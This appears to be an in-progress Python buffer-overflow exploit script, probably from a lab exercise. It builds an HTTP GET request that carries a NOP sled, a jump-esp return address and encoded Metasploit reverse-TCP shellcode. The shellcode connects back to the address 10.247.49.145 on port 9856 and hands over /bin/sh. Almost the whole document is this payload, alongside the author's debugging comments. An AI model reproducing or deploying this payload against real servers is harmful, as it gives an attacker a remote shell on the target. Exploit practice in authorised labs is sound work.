# linux/x86/shell_reverse_tcp - 198 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_mixed
# VERBOSE=false, LHOST=10.247.49.145, LPORT=9856, 
# ReverseAllowProxy=false, ReverseConnectRetries=5, 
# ReverseListenerThreaded=false, PrependFork=false, 
# PrependSetresuid=false, PrependSetreuid=false, 
# PrependSetuid=false, PrependSetresgid=false, 
# PrependSetregid=false, PrependSetgid=false, 
# PrependChrootBreak=false, AppendExit=false, 
# InitialAutoRunScript=, AutoRunScript=, CMD=/bin/sh

nop = b"\x90"

buf =  b"GET / "
buf += (nop * 1031) #should be x89 not xcc; doing for debugging
#CURRENTLY DEBUGGING (TRAP)
buf += b"\xa7\x2b\x12\x42" #jump esp
#buf += "\x1b\xf6\x14\x42"
buf += (nop * 90) #used to be 23
buf += "\x89\xe0\xdb\xca\xd9\x70\xf4\x5b\x53\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x35\x61\x59\x4b\x49"
buf += "\x67\x39\x73\x32\x73\x52\x63\x70\x53\x43\x5a\x65\x52"
buf += "\x6d\x59\x58\x61\x48\x30\x45\x36\x6a\x6d\x4f\x70\x6a"
buf += "\x33\x32\x79\x68\x30\x45\x6f\x4a\x6d\x6f\x70\x71\x59"
buf += "\x33\x49\x6a\x59\x42\x48\x65\x5a\x6b\x47\x70\x31\x4c"
buf += "\x51\x72\x48\x77\x72\x47\x70\x54\x66\x6b\x30\x6b\x39"
buf += "\x4b\x51\x48\x30\x31\x76\x66\x30\x62\x71\x33\x63\x6d"
buf += "\x63\x47\x73\x6f\x79\x39\x71\x7a\x6d\x4b\x30\x42\x72"
buf += "\x53\x58\x42\x4e\x74\x6f\x70\x73\x70\x68\x51\x78\x66"
buf += "\x4f\x74\x6f\x33\x52\x72\x49\x6c\x49\x49\x73\x63\x62"
buf += "\x53\x63\x6b\x39\x58\x61\x6e\x50\x44\x4b\x6a\x6d\x6f"
buf += "\x70\x41\x41"
buf += b" HTTP/1.1 " #22 or 24 for second nops gets me close, 23 returns ridiculous ans
 #- 16 for all other chars that aren't part of nop sled or shellcode
#buf += b"\x15\xfa\xff\xbf" #had 16 but changed to 15 for debugging mode.

#hits trap/breakpoint, now what?

print(buf);

